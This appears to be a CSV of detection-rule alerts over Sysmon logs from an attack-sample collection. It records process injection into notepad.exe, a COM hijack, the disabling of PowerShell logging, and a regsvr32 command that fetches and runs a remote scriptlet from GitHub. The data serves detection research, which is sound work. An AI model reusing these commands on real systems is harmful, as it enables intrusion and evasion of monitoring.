2019-05-18T17:16:17.395671+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18716,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2864
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.395
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.426921+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18717,IEWIN7,"TargetProcessId: 2840
NewThreadId: 4012
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.426
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.442546+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18718,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3524
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.442
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.489421+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18719,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3252
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00580000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.489
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.505046+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18720,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3228
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00580000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.505
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.520671+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18721,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3848
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00580000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.520
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.536296+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18722,IEWIN7,"TargetProcessId: 2840
NewThreadId: 4008
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00580000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.536
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.551921+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18723,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2124
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00580000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.551
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.567546+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18724,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2256
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00580000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.567
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.567546+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18725,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1720
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00580000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.567
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.583171+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18726,IEWIN7,"TargetProcessId: 2840
NewThreadId: 588
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00580000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.583
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.598796+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18727,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1892
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00580000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.598
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.614421+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18728,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2076
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00580000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.614
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.661296+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18729,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2248
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.661
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.708171+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18730,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3212
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00570000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.708
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.786296+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18731,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1632
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00541485'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.786
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:18.833171+00:00,PowerShell Core DLL Loaded By Non PowerShell Process,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,7,18732,IEWIN7,"Image: C:\Windows\System32\notepad.exe
Signature: ''
Hashes: SHA1=7208841D5A6BF1CDF957662E9E26FAB03F1EBCCD,MD5=774F7D6F5005983BE1CCCBCC3F2EC910,SHA256=8BC2E5C5413574C9AFC02BFBAA38E0ACD522DB1924B37FD0AE66061F46CC2838,IMPHASH=00000000000000000000000000000000
RuleName: Defense Evasion - Unmanaged PowerShell Detected
Description: System.Management.Automation
ProcessId: 2840
SignatureStatus: Unavailable
ProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
Signed: 'false'
FileVersion: 6.1.7601.17514
ImageLoaded: C:\Windows\assembly\NativeImages_v2.0.50727_32\System.Management.A#\4b93b6bd71723bed2fa9dd778436dd5e\System.Management.Automation.ni.dll
Product: Microsoft (R) Windows (R) Operating System
Company: Microsoft Corporation
UtcTime: 2019-05-18 17:16:18.786
"
2019-05-18T17:50:36.858385+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Execution/exec_sysmon_1_7_jscript9_defense_evasion.evtx,1,Microsoft-Windows-Sysmon,1,18849,IEWIN7,"Image: C:\ProgramData\winpm.exe
RuleName: Execution - jscript9 engine invoked via clsid
Description: Microsoft ® Console Based Script Host
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
ParentProcessId: 2940
LogonGuid: 365ABB72-433D-5CE0-0000-002031350100
Hashes: SHA1=C537FF2520215555B6E7B1B71C237F73D960BBED,MD5=41B81EF73218EC0EA0EC74F1C4C0F7B1,SHA256=D1B611E6D672AFC5A3D0F443FD8E2618B7416EFE2DD36593E971BF2F027A9AE3,IMPHASH=BFA8DFA346E250F59C0E2F57DAEFD14D
ParentProcessGuid: 365ABB72-43E7-5CE0-0000-0010C6D20B00
ProcessId: 1884
CurrentDirectory: c:\ProgramData\
ProcessGuid: 365ABB72-45EC-5CE0-0000-00103A3E2400
CommandLine: winpm.exe  //e:{16d51579-a30b-4c8b-a276-0ff4dc41e755} winpm_update.js
FileVersion: 5.8.7601.24288
User: IEWIN7\IEUser
LogonId: '0x13531'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-18 17:50:36.858
"
2019-05-18T17:51:14.254967+00:00,Hacktool - EDR-Freeze Execution;Potentially Suspicious Regsvr32 HTTP/FTP Pattern,data/EVTX-ATTACK-SAMPLES/Execution/exec_sysmon_1_7_jscript9_defense_evasion.evtx,1,Microsoft-Windows-Sysmon,1,18851,IEWIN7,"Image: C:\Windows\System32\regsvr32.exe
RuleName: ''
Description: Microsoft(C) Register Server
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 964
LogonGuid: 365ABB72-433D-5CE0-0000-002031350100
Hashes: SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583
ParentProcessGuid: 365ABB72-433C-5CE0-0000-00100FD20000
ProcessId: 2600
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-4612-5CE0-0000-00103D1E2600
CommandLine: /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13531'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-18 17:51:14.254
"
2019-05-19T17:32:00.482982+00:00,Hacktool - EDR-Freeze Execution;Hiding Files with Attrib.exe;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_hiding_files_via_attrib_cmdlet.evtx,1,Microsoft-Windows-Sysmon,1,22013,DC1.insecurebank.local,"Image: C:\Windows\System32\attrib.exe
RuleName: technique_id=T1158,technique_name=Hidden Files and DirectoriesHidden Files and Directories
Description: Attribute Utility
TerminalSessionId: 2
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3408
LogonGuid: DFAE8213-9133-5CE1-0000-0020CC660500
Hashes: SHA1=B71C1331AC5FA214076E5CD5C885712447057B96,MD5=116D463D2F5DBF76F7E2F5C6D8B5D3BB,SHA256=EBE94E294D86C714BED13EF018E70F75C37F8D8259144C0C847637EDC0222ECB,IMPHASH=461A33302E82ED68F1A74C083E27BD02
ParentProcessGuid: DFAE8213-91CC-5CE1-0000-0010BEF40600
ProcessId: 2728
CurrentDirectory: c:\ProgramData\
ProcessGuid: DFAE8213-9310-5CE1-0000-0010EABA0A00
CommandLine: attrib  +h nbtscan.exe
FileVersion: 6.3.9600.16384 (winblue_rtm.130821-1623)
User: insecurebank\Administrator
LogonId: '0x566cc'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-19 17:32:00.478
"
2019-05-19T18:05:07.719920+00:00,PowerShell Logging Disabled Via Registry Key Tampering;Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_PsScriptBlockLogging_disabled_sysmon12_13.evtx,1,Microsoft-Windows-Sysmon,13,18967,IEWIN7,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging
RuleName: Defense Evasion - PowerShell Audit Settings Changed
EventType: SetValue
ProcessId: 1348
ProcessGuid: 365ABB72-9AD3-5CE1-0000-0010F55C1800
UtcTime: 2019-05-19 18:05:07.704
Details: DWORD (0x00000000)
"
2019-05-21T00:35:07.308923+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,1,370,IEWIN7,"Image: C:\Users\IEUser\Downloads\com-hijack.exe
RuleName: ''
Description: '?'
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: '?'
Company: '?'
ParentProcessId: 1376
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=6F598827EFE472BC8D98CD173AD49B35B041000C,MD5=4177769EEF9E078971DA6EE31BDAE45F,SHA256=E624863387832C7BBE47D17A346AAB6A76638A2C9B5368FD7308A28775F1478A,IMPHASH=9E0317422070F8D5638E230F22763466
ParentProcessGuid: 365ABB72-39CD-5CE3-0000-0010A0E30000
ProcessId: 1912
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-47BB-5CE3-0000-0010BFA83E00
CommandLine: '""C:\Users\IEUser\Downloads\com-hijack.exe"" '
FileVersion: '?'
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: High
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-05-21 00:35:07.297
"
2019-05-21T00:35:07.474160+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,1,374,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Users\IEUser\Downloads\com-hijack.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1912
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-47BB-5CE3-0000-0010BFA83E00
ProcessId: 3944
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-47BB-5CE3-0000-001071AD3E00
CommandLine: C:\Windows\system32\cmd.exe /c test.bat
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\Downloads\com-hijack.exe
UtcTime: 2019-05-21 00:35:07.386
"
2019-05-21T00:35:07.474160+00:00,Potential Persistence Using DebugPath,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,13,372,IEWIN7,"Image: C:\Users\IEUser\Downloads\com-hijack.exe
TargetObject: HKU\S-1-5-21-3583694148-1414552638-2922671848-1000_CLASSES\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32\(Default)
RuleName: ''
EventType: SetValue
ProcessId: 1912
ProcessGuid: 365ABB72-47BB-5CE3-0000-0010BFA83E00
UtcTime: 2019-05-21 00:35:07.375
Details: C:\ProgramData\demo.dll
"
2019-05-21T00:35:07.474160+00:00,UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,11,373,IEWIN7,"ProcessGuid: 365ABB72-47BB-5CE3-0000-0010BFA83E00
CreationUtcTime: 2019-05-20 23:39:21.672
UtcTime: 2019-05-21 00:35:07.375
ProcessId: 1912
RuleName: ''
TargetFilename: C:\Users\IEUser\Downloads\test.bat
Image: C:\Users\IEUser\Downloads\com-hijack.exe
"
2019-05-21T00:35:07.474160+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,1,376,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Users\IEUser\Downloads\com-hijack.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1912
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-47BB-5CE3-0000-0010BFA83E00
ProcessId: 3176
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-47BB-5CE3-0000-00108CAD3E00
CommandLine: C:\Windows\system32\cmd.exe /c pause
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\Downloads\com-hijack.exe
UtcTime: 2019-05-21 00:35:07.386
"
2019-05-21T00:35:07.518223+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,1,378,IEWIN7,"Image: C:\Program Files\Mozilla Firefox\firefox.exe
RuleName: ''
Description: Firefox
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\cmd.exe /c test.bat
Product: Firefox
Company: Mozilla Corporation
ParentProcessId: 3944
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=B18D536DA2242D6D9BB66CBE63CF312ABC9987A8,MD5=6AC1B75613E6143F94FF7A933B7993FC,SHA256=ABCE2767221B43127068C82BE7EBDF66FAA38B72F67676311FA4589075502A7F,IMPHASH=C5596CA4210F5F3474B68D7D54A73D16
ParentProcessGuid: 365ABB72-47BB-5CE3-0000-001071AD3E00
ProcessId: 3168
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-47BB-5CE3-0000-001053AF3E00
CommandLine: '""C:\Program Files\Mozilla Firefox\firefox.exe""'
FileVersion: 66.0.5
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-21 00:35:07.397
"
2019-05-21T00:35:07.870729+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,1,379,IEWIN7,"Image: C:\Program Files\Mozilla Firefox\firefox.exe
RuleName: ''
Description: Firefox
TerminalSessionId: 1
ParentCommandLine: '""C:\Program Files\Mozilla Firefox\firefox.exe""'
Product: Firefox
Company: Mozilla Corporation
ParentProcessId: 3168
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=B18D536DA2242D6D9BB66CBE63CF312ABC9987A8,MD5=6AC1B75613E6143F94FF7A933B7993FC,SHA256=ABCE2767221B43127068C82BE7EBDF66FAA38B72F67676311FA4589075502A7F,IMPHASH=C5596CA4210F5F3474B68D7D54A73D16
ParentProcessGuid: 365ABB72-47BB-5CE3-0000-001053AF3E00
ProcessId: 3936
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-47BB-5CE3-0000-001019C53E00
CommandLine: '""C:\Program Files\Mozilla Firefox\firefox.exe"" -contentproc --channel=""3168.0.153744822\2027949517"" -parentBuildID 20190507012018 -greomni ""C:\Program Files\Mozilla Firefox\omni.ja"" -appomni ""C:\Program Files\Mozilla Firefox\browser\omni.ja"" -appdir ""C:\Program Files\Mozilla Firefox\browser"" - 3168 ""\\.\pipe\gecko-crash-server-pipe.3168"" 956 gpu'
FileVersion: 66.0.5
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: High
ParentImage: C:\Program Files\Mozilla Firefox\firefox.exe
UtcTime: 2019-05-21 00:35:07.837
"
2019-05-21T00:35:08.279417+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,1,381,IEWIN7,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: '""C:\Program Files\Mozilla Firefox\firefox.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3168
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=9018A7D6CDBE859A430E8794E73381F77C840BE0,MD5=60B7C0FEAD45F2066E5B805A91F4F0FC,SHA256=80C10EE5F21F92F89CBC293A59D2FD4C01C7958AACAD15642558DB700943FA22,IMPHASH=F93B5D76132F6E6068946EC238813CE1
ParentProcessGuid: 365ABB72-47BB-5CE3-0000-001053AF3E00
ProcessId: 2596
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-47BC-5CE3-0000-00107DDD3E00
CommandLine: '""C:\Windows\System32\calc.exe"" '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: High
ParentImage: C:\Program Files\Mozilla Firefox\firefox.exe
UtcTime: 2019-05-21 00:35:08.224
"
